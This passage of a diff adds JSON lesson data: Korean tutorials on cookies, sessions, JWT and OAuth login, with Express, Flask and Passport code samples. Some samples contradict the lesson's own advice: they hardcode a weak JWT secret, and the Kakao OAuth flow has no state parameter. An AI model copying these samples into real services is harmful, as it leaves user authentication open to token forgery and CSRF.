+        "content": "### 프로젝트별 추천\n\n```\n📱 모바일 앱\n└── JWT + OAuth (소셜 로그인)\n\n🌐 단일 웹 서비스\n└── 세션 + 쿠키\n\n🏢 마이크로서비스\n└── JWT (서비스 간 인증)\n\n🛒 이커머스\n└── 세션 (즉시 로그아웃 중요)\n\n📊 SaaS / API 서비스\n└── JWT + API Key\n\n🎮 게임 / 앱\n└── OAuth (간편 로그인)\n```\n\n### 보안 우선순위\n\n```\n1위: 세션 + 쿠키\n├── 서버에서 상태 관리\n├── 즉시 무효화 가능\n└── HttpOnly로 XSS 방어\n\n2위: JWT (올바르게 구현 시)\n├── 짧은 만료 + Refresh Token\n├── HttpOnly 쿠키 사용\n└── 블랙리스트 구현\n\n3위: OAuth\n├── 외부 의존\n├── 토큰 관리 복잡\n└── 구현 실수 가능성\n```\n\n### 면접 답변 예시\n\n```\nQ: \"어떤 인증 방식을 사용하시나요?\"\n\nA: \"프로젝트 특성에 따라 선택합니다.\n\n   단일 웹 서비스라면 세션을 선택합니다.\n   즉시 로그아웃과 보안이 중요하기 때문입니다.\n\n   API 서버나 마이크로서비스라면 JWT를\n   선택합니다. Stateless하고 확장성이\n   좋기 때문입니다.\n\n   소셜 로그인이 필요하면 OAuth를 통해\n   카카오/구글 로그인을 구현하고,\n   내부적으로는 JWT를 발급합니다.\"\n```\n\n### 흔한 실수\n\n```\n❌ JWT를 localStorage에 저장\n❌ 세션 ID 예측 가능하게 생성\n❌ OAuth state 파라미터 미사용\n❌ Refresh Token 클라이언트 노출\n❌ HTTPS 미사용\n\n✅ 올바른 구현:\n├── 토큰/세션 ID 안전하게 보관\n├── 충분한 랜덤성 확보\n├── CSRF/XSS 방어\n└── HTTPS 필수\n```"
+      }
+    ]
+  },
+  "05_인증/cookie-vs-session": {
+    "id": "05_인증/cookie-vs-session",
+    "title": "쿠키 vs 세션",
+    "category": "network",
+    "subCategory": "05_인증",
+    "language": "Python",
+    "description": "쿠키와 세션의 차이점을 비교합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🍪🎫 쿠키 vs 세션",
+        "content": "## 🍪🎫 한 줄 요약\n> **쿠키는 브라우저 메모, 세션은 서버 명부** - 둘 다 \"기억\"하지만 장소가 달라요!\n\n---\n\n## 💡 핵심 차이\n\n### 저장 위치\n```\n🍪 쿠키\n├── 브라우저(클라이언트)에 저장\n├── 사용자가 볼 수 있음\n└── 수정/삭제 가능\n\n🎫 세션\n├── 서버에 저장\n├── 사용자는 ID만 가짐\n└── 직접 수정 불가\n```\n\n### 비유로 이해하기\n```\n🍪 쿠키 = 신분증을 직접 들고 다님\n├── 내 정보가 카드에 적혀있음\n├── 분실하면 정보 노출 위험\n└── 빠르게 확인 가능\n\n🎫 세션 = 번호표만 들고 다님\n├── 번호로 서버에서 조회\n├── 분실해도 번호만 노출\n└── 서버 조회 필요\n```\n\n---\n\n## 🎯 상세 비교\n\n| 구분 | 쿠키 | 세션 |\n|-----|------|------|\n| 저장 위치 | 브라우저 | 서버 |\n| 보안 | 낮음 (노출 위험) | 높음 (서버 보관) |\n| 용량 | 4KB 제한 | 제한 없음 |\n| 속도 | 빠름 | 서버 조회 필요 |\n| 만료 | 설정된 기간 | 서버 설정 따름 |\n| 서버 부하 | 없음 | 저장소 필요 |\n\n### 실제 사용 예시\n```\n🍪 쿠키만 사용:\n├── \"오늘 하루 보지 않기\"\n├── 다크모드 설정\n├── 언어 설정\n└── 장바구니 (비회원)\n\n🎫 세션 사용:\n├── 로그인 상태 유지\n├── 결제 정보\n├── 개인 정보\n└── 민감한 데이터\n\n🍪 + 🎫 함께 사용 (일반적):\n├── 쿠키: 세션 ID 저장\n└── 세션: 실제 사용자 데이터\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 비교 코드",
+        "content": "### 쿠키만 사용 (민감하지 않은 데이터)\n\n```javascript\n// 테마 설정 - 쿠키로 충분\napp.get('/set-theme', (req, res) => {\n  res.cookie('theme', 'dark', {\n    maxAge: 365 * 24 * 60 * 60 * 1000, // 1년\n    httpOnly: false  // JS에서 읽어야 함\n  });\n  res.send('테마 저장!');\n});\n\n// 클라이언트에서 테마 적용\nconst theme = document.cookie\n  .split(';')\n  .find(c => c.includes('theme'))\n  ?.split('=')[1] || 'light';\n\ndocument.body.className = theme;\n```\n\n### 세션 사용 (민감한 데이터)\n\n```javascript\n// 로그인 - 세션 사용\napp.post('/login', (req, res) => {\n  // 비밀번호 확인 후...\n  req.session.user = {\n    id: user.id,\n    name: user.name,\n    email: user.email,\n    role: user.role\n  };\n  res.json({ message: '로그인 성공' });\n});\n\n// 쿠키엔 세션 ID만!\n// Set-Cookie: connect.sid=s%3Axyz123...\n```\n\n### 쿠키 + 세션 조합\n\n```javascript\n// 1. 로그인 시: 세션 생성 + 쿠키로 ID 전달\napp.post('/login', async (req, res) => {\n  const user = await authenticate(req.body);\n\n  // 세션에 사용자 정보 저장 (서버)\n  req.session.userId = user.id;\n  req.session.role = user.role;\n\n  // \"자동 로그인\" 체크 시: 영구 쿠키 추가\n  if (req.body.rememberMe) {\n    res.cookie('remember_token', generateToken(), {\n      maxAge: 30 * 24 * 60 * 60 * 1000, // 30일\n      httpOnly: true,\n      secure: true\n    });\n  }\n\n  res.json({ success: true });\n});\n\n// 2. 세션 만료 시: remember_token으로 자동 로그인\napp.use(async (req, res, next) => {\n  if (!req.session.userId && req.cookies.remember_token) {\n    const user = await findByToken(req.cookies.remember_token);\n    if (user) {\n      req.session.userId = user.id;\n    }\n  }\n  next();\n});\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 선택 가이드",
+        "content": "### 언제 뭘 쓸까?\n\n```\n✅ 쿠키만 사용:\n├── 사용자 설정 (테마, 언어)\n├── 비회원 장바구니\n├── 팝업 \"오늘 하루 보지 않기\"\n├── 간단한 상태 저장\n└── 노출되어도 상관없는 데이터\n\n✅ 세션 필수:\n├── 로그인 상태\n├── 결제/금융 정보\n├── 개인정보\n├── 권한 정보\n└── 민감한 모든 데이터\n```\n\n### 보안 체크리스트\n\n```\n🍪 쿠키 보안:\n□ HttpOnly 설정\n□ Secure 설정 (HTTPS)\n□ SameSite 설정\n□ 민감 정보 저장 금지\n□ 적절한 만료 시간\n\n🎫 세션 보안:\n□ 강력한 secret 키\n□ HTTPS 사용\n□ 세션 ID 재생성 (로그인 후)\n□ 적절한 타임아웃\n□ 안전한 저장소 (Redis 등)\n```\n\n### 흔한 실수\n\n```\n❌ 쿠키에 비밀번호 저장\n❌ 쿠키에 개인정보 저장\n❌ HttpOnly 없이 인증 쿠키\n❌ 세션 ID 예측 가능\n❌ 로그아웃 시 세션 미삭제\n\n✅ 올바른 방법:\n├── 민감 정보는 세션에\n├── 쿠키엔 ID만 저장\n└── 보안 옵션 필수 설정\n```"
+      }
+    ]
+  },
+  "05_인증/cookie": {
+    "id": "05_인증/cookie",
+    "title": "쿠키",
+    "category": "network",
+    "subCategory": "05_인증",
+    "language": "Python",
+    "description": "HTTP 쿠키의 개념과 활용법을 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🍪 쿠키란?",
+        "content": "## 🍪 한 줄 요약\n> **브라우저에 저장되는 작은 메모장** - 웹사이트가 나를 기억하게 해줘요!\n\n---\n\n## 💡 왜 필요한가?\n\n### 문제 상황:\n```\nHTTP는 \"기억력이 없다\" (Stateless)\n\n매 요청마다:\n\"안녕하세요, 저 홍길동이에요\" (로그인)\n\"안녕하세요, 저 홍길동이에요\" (장바구니)\n\"안녕하세요, 저 홍길동이에요\" (결제)\n\n→ 너무 불편해! 😩\n```\n\n### 쿠키로 해결:\n```\n🍪 쿠키 = 브라우저의 메모장\n\n1. 로그인 → 서버: \"이 쿠키 가지고 다녀\" (쿠키 발급)\n2. 장바구니 → 브라우저: 쿠키 자동 첨부\n3. 결제 → 브라우저: 쿠키 자동 첨부\n\n→ 자동으로 \"나 홍길동이야\" 전달!\n```\n\n---\n\n## 🎯 쿠키의 구조\n\n### 쿠키 예시:\n```\nSet-Cookie: user_id=12345; Max-Age=3600; Path=/; Secure; HttpOnly\n\n├── user_id=12345  : 이름=값 (실제 데이터)\n├── Max-Age=3600   : 1시간 후 삭제\n├── Path=/         : 모든 경로에서 전송\n├── Secure         : HTTPS에서만 전송\n└── HttpOnly       : JavaScript 접근 불가\n```\n\n### 쿠키 종류:\n```\n📁 세션 쿠키 (Session Cookie)\n├── 브라우저 닫으면 삭제\n└── 임시 로그인에 사용\n\n📁 영구 쿠키 (Persistent Cookie)\n├── 만료일까지 유지\n├── \"자동 로그인\", \"7일간 보지 않기\"\n└── Max-Age 또는 Expires 설정\n\n📁 서드파티 쿠키 (Third-party Cookie)\n├── 다른 도메인에서 설정한 쿠키\n├── 광고 추적에 사용\n└── 점점 차단되는 추세\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 쿠키 다루기",
+        "content": "### 서버에서 쿠키 설정 (Node.js/Express)\n\n```javascript\n// 쿠키 설정\napp.get('/login', (req, res) => {\n  res.cookie('user_id', '12345', {\n    maxAge: 24 * 60 * 60 * 1000, // 1일\n    httpOnly: true,  // JS 접근 차단\n    secure: true,    // HTTPS만\n    sameSite: 'Lax'  // CSRF 방지\n  });\n  res.send('로그인 성공!');\n});\n\n// 쿠키 읽기\napp.get('/profile', (req, res) => {\n  const userId = req.cookies.user_id;\n  res.send(`사용자: ${userId}`);\n});\n\n// 쿠키 삭제\napp.get('/logout', (req, res) => {\n  res.clearCookie('user_id');\n  res.send('로그아웃!');\n});\n```\n\n### 브라우저에서 쿠키 (JavaScript)\n\n```javascript\n// 쿠키 읽기 (HttpOnly가 아닌 경우만)\nconsole.log(document.cookie);\n// \"theme=dark; lang=ko\"\n\n// 쿠키 설정\ndocument.cookie = \"theme=dark; max-age=86400; path=/\";\n\n// 쿠키 삭제 (만료일을 과거로)\ndocument.cookie = \"theme=; max-age=0\";\n\n// 쿠키 파싱 유틸\nfunction getCookie(name) {\n  const cookies = document.cookie.split(';');\n  for (let cookie of cookies) {\n    const [key, value] = cookie.trim().split('=');\n    if (key === name) return value;\n  }\n  return null;\n}\n```\n\n### Python Flask\n\n```python\nfrom flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/login')\ndef login():\n    resp = make_response('로그인 성공!')\n    resp.set_cookie('user_id', '12345',\n                    max_age=86400,  # 1일\n                    httponly=True,\n                    secure=True)\n    return resp\n\n@app.route('/profile')\ndef profile():\n    user_id = request.cookies.get('user_id')\n    return f'사용자: {user_id}'\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 쿠키 보안 설정",
+        "content": "### 필수 보안 옵션\n\n```\n✅ HttpOnly\n├── document.cookie로 접근 불가\n└── XSS 공격 방지\n\n✅ Secure\n├── HTTPS에서만 전송\n└── 네트워크 도청 방지\n\n✅ SameSite\n├── Strict: 같은 사이트에서만\n├── Lax: 링크 클릭은 허용 (기본값)\n└── None: 모두 허용 (Secure 필수)\n└── CSRF 공격 방지\n```\n\n### 쿠키 크기 제한\n\n```\n📏 제한 사항:\n├── 쿠키 1개: 최대 4KB\n├── 도메인당: 약 20~50개\n└── 총 용량: 도메인당 4KB 권장\n\n💡 큰 데이터는?\n└── 쿠키 대신 localStorage 또는\n    서버 세션 사용!\n```\n\n### 개발자 도구로 확인\n\n```\nChrome → F12 → Application 탭 → Cookies\n\n확인 가능:\n├── 쿠키 이름/값\n├── 만료일\n├── 크기\n├── HttpOnly, Secure 여부\n└── 직접 수정/삭제 가능\n```"
+      }
+    ]
+  },
+  "05_인증/jwt-structure": {
+    "id": "05_인증/jwt-structure",
+    "title": "JWT 구조",
+    "category": "network",
+    "subCategory": "05_인증",
+    "language": "Python",
+    "description": "JWT의 Header, Payload, Signature를 상세히 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "📋 JWT 구조 분석",
+        "content": "## 📋 한 줄 요약\n> **Header.Payload.Signature** - 세 부분이 점(.)으로 연결되어 있어요!\n\n---\n\n## 🎯 세 부분 상세 분석\n\n### 1. Header (헤더)\n```json\n{\n  \"alg\": \"HS256\",   // 서명 알고리즘\n  \"typ\": \"JWT\"      // 토큰 타입\n}\n\n↓ Base64 인코딩\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\n```\n\n### 2. Payload (내용)\n```json\n{\n  // 등록된 클레임 (표준)\n  \"iss\": \"myapp.com\",     // 발급자\n  \"sub\": \"user123\",       // 주제 (보통 user id)\n  \"exp\": 1735689600,      // 만료 시간\n  \"iat\": 1735686000,      // 발급 시간\n\n  // 공개 클레임 (커스텀)\n  \"name\": \"홍길동\",\n  \"role\": \"admin\"\n}\n\n↓ Base64 인코딩\neyJ1c2VySWQiOjEsIm5hbWUiOiLtmY3quLjrj5kiLCJyb2xlIjoiYWRtaW4ifQ\n```\n\n### 3. Signature (서명)\n```\nHMACSHA256(\n  base64(header) + \".\" + base64(payload),\n  secret_key\n)\n\n↓ 결과\nSflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n```\n\n---\n\n## 🔒 서명이 중요한 이유\n\n```\n🚨 해커가 payload 변조 시도:\n\n원본: {\"role\": \"user\"}\n변조: {\"role\": \"admin\"}\n\n서버 검증:\n1. header + payload로 서명 재계산\n2. 토큰의 서명과 비교\n3. 불일치! → 변조됨! → 거부 ❌\n\n→ 서명이 있어서 변조 불가능!\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 JWT 디코딩/생성",
+        "content": "### JWT 수동 디코딩\n\n```javascript\n// JWT 디코딩 (검증 없이 내용만 보기)\nfunction decodeJWT(token) {\n  const parts = token.split('.');\n\n  const header = JSON.parse(\n    Buffer.from(parts[0], 'base64').toString()\n  );\n\n  const payload = JSON.parse(\n    Buffer.from(parts[1], 'base64').toString()\n  );\n\n  return { header, payload };\n}\n\n// 사용\nconst token = 'eyJhbGc...';\nconst { header, payload } = decodeJWT(token);\n\nconsole.log(header);\n// { alg: 'HS256', typ: 'JWT' }\n\nconsole.log(payload);\n// { userId: 1, name: '홍길동', exp: 1735689600 }\n```\n\n### 클레임 종류\n\n```javascript\nconst jwt = require('jsonwebtoken');\n\n// 다양한 클레임 사용\nconst token = jwt.sign({\n  // 등록된 클레임 (Registered Claims)\n  iss: 'myapp.com',      // issuer: 발급자\n  sub: 'user_123',       // subject: 대상\n  aud: 'myapp-client',   // audience: 대상자\n  exp: Math.floor(Date.now() / 1000) + 3600, // 만료\n  nbf: Math.floor(Date.now() / 1000), // not before\n  iat: Math.floor(Date.now() / 1000), // issued at\n  jti: 'unique-token-id', // JWT ID\n\n  // 비공개 클레임 (Private Claims) - 커스텀\n  userId: 1,\n  role: 'admin',\n  permissions: ['read', 'write']\n\n}, SECRET);\n```\n\n### 서명 알고리즘 비교\n\n```javascript\n// HS256 (대칭키) - 같은 키로 서명/검증\nconst tokenHS = jwt.sign(payload, 'shared-secret', {\n  algorithm: 'HS256'\n});\n\n// RS256 (비대칭키) - 다른 키로 서명/검증\nconst privateKey = fs.readFileSync('private.key');\nconst publicKey = fs.readFileSync('public.key');\n\nconst tokenRS = jwt.sign(payload, privateKey, {\n  algorithm: 'RS256'\n});\n\n// 검증은 public key로\njwt.verify(tokenRS, publicKey);\n```\n\n### Python에서 디코딩\n\n```python\nimport base64\nimport json\n\ndef decode_jwt(token):\n    parts = token.split('.')\n\n    # Base64 URL 디코딩\n    def decode_part(part):\n        # padding 추가\n        padding = 4 - len(part) % 4\n        part += '=' * padding\n        return json.loads(base64.urlsafe_b64decode(part))\n\n    header = decode_part(parts[0])\n    payload = decode_part(parts[1])\n\n    return header, payload\n\n# 사용\nheader, payload = decode_jwt(token)\nprint(f\"만료: {payload['exp']}\")\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 JWT 구조 활용",
+        "content": "### 알고리즘 선택\n\n```\nHS256 (HMAC + SHA256)\n├── 대칭키: 같은 키로 서명/검증\n├── 간단하고 빠름\n├── 서버 간 키 공유 필요\n└── 단일 서비스에 적합\n\nRS256 (RSA + SHA256)\n├── 비대칭키: private으로 서명, public으로 검증\n├── 더 복잡하지만 안전\n├── public key 공개 가능\n└── 마이크로서비스에 적합\n\n권장:\n├── 단일 서버: HS256\n└── 여러 서비스: RS256\n```\n\n### Payload 설계\n\n```\n✅ 포함할 것:\n├── 사용자 ID (sub)\n├── 권한/역할\n├── 만료 시간 (exp)\n└── 발급 시간 (iat)\n\n❌ 포함하면 안 되는 것:\n├── 비밀번호\n├── 신용카드 정보\n├── 주민번호\n└── 민감한 개인정보\n\n이유:\n└── JWT는 암호화가 아니라\n    누구나 디코딩 가능!\n```\n\n### jwt.io 활용\n\n```\nhttps://jwt.io\n\n1. 토큰 붙여넣기 → 자동 디코딩\n2. 만료 시간 확인\n3. 서명 검증 (secret 입력)\n4. 디버깅에 매우 유용!\n\n⚠️ 주의:\n├── 실제 서비스 토큰\n└── 공개 사이트에 붙여넣지 말 것!\n```\n\n### 만료 처리\n\n```javascript\n// 만료 확인\nfunction isExpired(token) {\n  const payload = decodeJWT(token).payload;\n  const now = Math.floor(Date.now() / 1000);\n  return payload.exp < now;\n}\n\n// 만료 임박 확인 (5분 전)\nfunction needsRefresh(token) {\n  const payload = decodeJWT(token).payload;\n  const now = Math.floor(Date.now() / 1000);\n  return payload.exp - now < 300; // 5분\n}\n```"
+      }
+    ]
+  },
+  "05_인증/jwt": {
+    "id": "05_인증/jwt",
+    "title": "JWT",
+    "category": "network",
+    "subCategory": "05_인증",
+    "language": "Python",
+    "description": "JSON Web Token의 개념과 인증 방식을 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🎟️ JWT란?",
+        "content": "## 🎟️ 한 줄 요약\n> **디지털 신분증** - 서버 확인 없이 본인 증명이 가능해요!\n\n---\n\n## 💡 왜 JWT가 필요한가?\n\n### 세션의 문제:\n```\n세션 방식:\n서버 A → 세션 저장\n서버 B → 세션 없음! 😱\n\n해결책 1: Redis 공유 세션\n└── 매번 Redis 조회 필요\n\n해결책 2: JWT ⭐\n└── 토큰 자체에 정보 포함\n└── 서버 조회 불필요!\n```\n\n### JWT 비유:\n```\n🎫 세션 = 영화관 예매 번호\n├── 번호만 들고 다님\n├── 좌석 확인? → 시스템 조회 필요\n└── 서버 의존적\n\n🎟️ JWT = 콘서트 티켓\n├── 티켓에 좌석, 날짜 다 적혀있음\n├── 티켓만 보면 정보 확인 가능\n├── 위조 방지 홀로그램 (서명)\n└── 서버 독립적\n```\n\n---\n\n## 🎯 JWT 구조\n\n### 세 부분으로 구성:\n```\nxxxxx.yyyyy.zzzzz\n  │      │     │\n  │      │     └── Signature (서명)\n  │      └── Payload (데이터)\n  └── Header (헤더)\n```\n\n### 실제 예시:\n```\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.\neyJ1c2VySWQiOjEsIm5hbWUiOiLtmY3quLjrj5kiLCJleHAiOjE3MzU2ODk2MDB9.\nSflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n\n해석:\nHeader: {\"alg\": \"HS256\", \"typ\": \"JWT\"}\nPayload: {\"userId\": 1, \"name\": \"홍길동\", \"exp\": 1735689600}\nSignature: 위조 방지 서명\n```\n\n### 중요한 특징:\n```\n⚠️ 암호화 ❌ → 인코딩 ⭕\n\n누구나 디코딩 가능!\n├── jwt.io 에서 붙여넣기만 해도 내용 보임\n├── 민감 정보 넣으면 안 됨!\n└── 비밀번호 절대 금지!\n\n서명만 검증:\n├── 내용이 변조되었는지\n└── 우리 서버가 발급했는지\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 JWT 사용하기",
+        "content": "### Node.js (jsonwebtoken)\n\n```javascript\nconst jwt = require('jsonwebtoken');\n\nconst SECRET = 'my-super-secret-key-12345';\n\n// 토큰 생성\nfunction createToken(user) {\n  return jwt.sign(\n    { userId: user.id, name: user.name },  // payload\n    SECRET,\n    { expiresIn: '1h' }  // 1시간 후 만료\n  );\n}\n\n// 토큰 검증\nfunction verifyToken(token) {\n  try {\n    const decoded = jwt.verify(token, SECRET);\n    return { valid: true, data: decoded };\n  } catch (err) {\n    return { valid: false, error: err.message };\n  }\n}\n\n// 로그인 API\napp.post('/login', async (req, res) => {\n  const user = await authenticate(req.body);\n  const token = createToken(user);\n\n  res.json({ token });\n});\n\n// 인증 미들웨어\nfunction authMiddleware(req, res, next) {\n  const authHeader = req.headers.authorization;\n  if (!authHeader) {\n    return res.status(401).json({ error: '토큰 없음' });\n  }\n\n  const token = authHeader.split(' ')[1]; // \"Bearer xxx\"\n  const result = verifyToken(token);\n\n  if (!result.valid) {\n    return res.status(401).json({ error: '유효하지 않은 토큰' });\n  }\n\n  req.user = result.data;\n  next();\n}\n\n// 보호된 API\napp.get('/profile', authMiddleware, (req, res) => {\n  res.json({ user: req.user });\n});\n```\n\n### Python (PyJWT)\n\n```python\nimport jwt\nfrom datetime import datetime, timedelta\n\nSECRET = 'my-super-secret-key-12345'\n\n# 토큰 생성\ndef create_token(user_id, name):\n    payload = {\n        'user_id': user_id,\n        'name': name,\n        'exp': datetime.utcnow() + timedelta(hours=1)\n    }\n    return jwt.encode(payload, SECRET, algorithm='HS256')\n\n# 토큰 검증\ndef verify_token(token):\n    try:\n        payload = jwt.decode(token, SECRET, algorithms=['HS256'])\n        return payload\n    except jwt.ExpiredSignatureError:\n        return None  # 만료됨\n    except jwt.InvalidTokenError:\n        return None  # 유효하지 않음\n\n# Flask 예시\n@app.route('/login', methods=['POST'])\ndef login():\n    user = authenticate(request.json)\n    token = create_token(user.id, user.name)\n    return {'token': token}\n\n@app.route('/profile')\ndef profile():\n    auth_header = request.headers.get('Authorization')\n    if not auth_header:\n        return {'error': '토큰 없음'}, 401\n\n    token = auth_header.split(' ')[1]\n    payload = verify_token(token)\n\n    if not payload:\n        return {'error': '유효하지 않은 토큰'}, 401\n\n    return {'user': payload}\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 JWT 실전 팁",
+        "content": "### Access Token + Refresh Token\n\n```\n문제: 토큰 탈취 시 만료까지 악용 가능\n\n해결: 토큰 2개 사용\n\n🔑 Access Token\n├── 짧은 만료 (15분~1시간)\n├── API 요청에 사용\n└── 탈취되어도 금방 만료\n\n🔄 Refresh Token\n├── 긴 만료 (7일~30일)\n├── Access Token 재발급용\n├── 안전하게 저장 (HttpOnly 쿠키)\n└── 탈취 시 강제 만료 가능\n```\n\n### 토큰 저장 위치\n\n```\n📱 모바일 앱:\n└── Secure Storage (Keychain/Keystore)\n\n🌐 웹 브라우저:\n├── Access: 메모리 (변수)\n├── Refresh: HttpOnly 쿠키\n└── localStorage는 XSS 위험!\n\n⚠️ 금지:\n├── localStorage (XSS 취약)\n├── 일반 쿠키 (XSS 취약)\n└── URL 파라미터 (노출)\n```\n\n### JWT vs 세션 선택\n\n```\n✅ JWT 적합:\n├── 마이크로서비스\n├── 여러 도메인/앱\n├── 모바일 앱\n├── Stateless API\n└── 확장성 중요\n\n✅ 세션 적합:\n├── 단일 서버\n├── 웹 브라우저 only\n├── 즉시 로그아웃 필요\n├── 짧은 세션\n└── 단순한 구조\n```\n\n### 흔한 실수\n\n```\n❌ 민감 정보를 payload에\n❌ 너무 긴 만료 시간\n❌ SECRET이 약하거나 노출\n❌ localStorage에 저장\n❌ 만료된 토큰 처리 안 함\n\n✅ 올바른 방법:\n├── payload에 최소 정보만\n├── 적절한 만료 시간\n├── 강력한 SECRET (환경변수)\n├── HttpOnly 쿠키 사용\n└── 만료 시 재발급 로직\n```"
+      }
+    ]
+  },
+  "05_인증/oauth": {
+    "id": "05_인증/oauth",
+    "title": "OAuth",
+    "category": "network",
+    "subCategory": "05_인증",
+    "language": "Python",
+    "description": "OAuth 2.0 인증 프레임워크를 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔐 OAuth란?",
+        "content": "## 🔐 한 줄 요약\n> **대리 인증** - 비밀번호 없이 카카오/구글이 대신 로그인해줘요!\n\n---\n\n## 💡 왜 OAuth가 필요한가?\n\n### 문제 상황:\n```\n앱: \"카카오 친구 목록 보여주세요\"\n사용자: \"네, 카카오 비밀번호는...\"\n\n⚠️ 위험!\n├── 앱이 비밀번호를 알게 됨\n├── 앱이 해킹되면? 비번 유출!\n└── 앱이 다른 것도 할 수 있음\n```\n\n### OAuth로 해결:\n```\n앱: \"카카오 로그인하세요\"\n사용자: (카카오에서 직접 로그인)\n카카오: \"이 앱에 친구 목록만 줄까요?\"\n사용자: \"네!\"\n카카오: \"여기 친구 목록 접근 토큰이요\"\n\n✅ 안전!\n├── 앱은 비밀번호 모름\n├── 허락한 것만 접근 가능\n└── 언제든 권한 취소 가능\n```\n\n---\n\n## 🎯 OAuth 등장인물\n\n```\n👤 Resource Owner (사용자)\n└── 카카오 계정 주인\n\n📱 Client (우리 앱)\n└── 카카오 로그인 붙인 앱\n\n🏢 Authorization Server (인증 서버)\n└── 카카오 로그인 페이지\n\n📦 Resource Server (리소스 서버)\n└── 카카오 API (친구 목록 등)\n```\n\n### OAuth 흐름 (Authorization Code)\n\n```\n┌─────────┐                          ┌─────────┐\n│  사용자  │                          │  카카오  │\n└────┬────┘                          └────┬────┘\n     │                                    │\n     │ 1. \"카카오로 로그인\" 클릭            │\n     │────────────────────────────────►   │\n     │                                    │\n     │ 2. 카카오 로그인 페이지              │\n     │◄────────────────────────────────   │\n     │                                    │\n     │ 3. 로그인 + 권한 동의               │\n     │────────────────────────────────►   │\n     │                                    │\n     │ 4. code 발급 (redirect)            │\n     │◄────────────────────────────────   │\n     │                                    │\n     ▼                                    │\n┌─────────┐                               │\n│  우리앱  │                               │\n└────┬────┘                               │\n     │ 5. code로 token 요청               │\n     │────────────────────────────────►   │\n     │                                    │\n     │ 6. access_token 발급               │\n     │◄────────────────────────────────   │\n     │                                    │\n     │ 7. 토큰으로 API 호출                │\n     │────────────────────────────────►   │\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 OAuth 구현하기",
+        "content": "### 카카오 로그인 (Node.js)\n\n```javascript\nconst axios = require('axios');\n\n// 환경변수\nconst KAKAO_CLIENT_ID = process.env.KAKAO_CLIENT_ID;\nconst KAKAO_CLIENT_SECRET = process.env.KAKAO_CLIENT_SECRET;\nconst REDIRECT_URI = 'http://localhost:3000/auth/kakao/callback';\n\n// 1. 카카오 로그인 페이지로 이동\napp.get('/auth/kakao', (req, res) => {\n  const kakaoAuthUrl = `https://kauth.kakao.com/oauth/authorize?` +\n    `client_id=${KAKAO_CLIENT_ID}` +\n    `&redirect_uri=${REDIRECT_URI}` +\n    `&response_type=code`;\n\n  res.redirect(kakaoAuthUrl);\n});\n\n// 2. 콜백: code → token 교환\napp.get('/auth/kakao/callback', async (req, res) => {\n  const { code } = req.query;\n\n  // code로 access_token 요청\n  const tokenResponse = await axios.post(\n    'https://kauth.kakao.com/oauth/token',\n    null,\n    {\n      params: {\n        grant_type: 'authorization_code',\n        client_id: KAKAO_CLIENT_ID,\n        client_secret: KAKAO_CLIENT_SECRET,\n        redirect_uri: REDIRECT_URI,\n        code: code\n      }\n    }\n  );\n\n  const { access_token } = tokenResponse.data;\n\n  // 3. 사용자 정보 가져오기\n  const userResponse = await axios.get(\n    'https://kapi.kakao.com/v2/user/me',\n    {\n      headers: { Authorization: `Bearer ${access_token}` }\n    }\n  );\n\n  const kakaoUser = userResponse.data;\n\n  // 4. 우리 서비스 로그인 처리\n  let user = await User.findOne({ kakaoId: kakaoUser.id });\n  if (!user) {\n    user = await User.create({\n      kakaoId: kakaoUser.id,\n      nickname: kakaoUser.properties.nickname\n    });\n  }\n\n  // 세션 또는 JWT 발급\n  req.session.userId = user.id;\n  res.redirect('/');\n});\n```\n\n### Google OAuth (Passport.js)\n\n```javascript\nconst passport = require('passport');\nconst GoogleStrategy = require('passport-google-oauth20').Strategy;\n\npassport.use(new GoogleStrategy({\n    clientID: process.env.GOOGLE_CLIENT_ID,\n    clientSecret: process.env.GOOGLE_CLIENT_SECRET,\n    callbackURL: '/auth/google/callback'\n  },\n  async (accessToken, refreshToken, profile, done) => {\n    // 사용자 찾기 또는 생성\n    let user = await User.findOne({ googleId: profile.id });\n    if (!user) {\n      user = await User.create({\n        googleId: profile.id,\n        email: profile.emails[0].value,\n        name: profile.displayName\n      });\n    }\n    done(null, user);\n  }\n));\n\n// 라우트\napp.get('/auth/google', passport.authenticate('google', {\n  scope: ['profile', 'email']\n}));\n\napp.get('/auth/google/callback',\n  passport.authenticate('google', { failureRedirect: '/login' }),\n  (req, res) => res.redirect('/')\n);\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 OAuth 실전 팁",
